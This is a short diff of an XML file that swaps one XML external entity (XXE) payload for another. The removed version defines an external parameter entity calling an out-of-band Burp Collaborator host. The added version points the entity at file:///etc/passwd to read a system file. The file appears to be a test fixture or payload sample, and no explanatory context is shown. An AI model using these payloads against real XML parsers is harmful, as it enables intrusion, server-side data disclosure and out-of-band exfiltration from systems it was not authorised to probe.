@@ -1,5 +1,4 @@
-    <?xml version="1.0" ?>
-    <!DOCTYPE root [
-    <!ENTITY % ext SYSTEM "http://8gp1gqg44gra2qtuyxhsytfztqzgn5.burpcollaborator.net/x"> %ext;
-    ]>
-    <r></r>
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "file:///etc/passwd"> %ext;
+]>
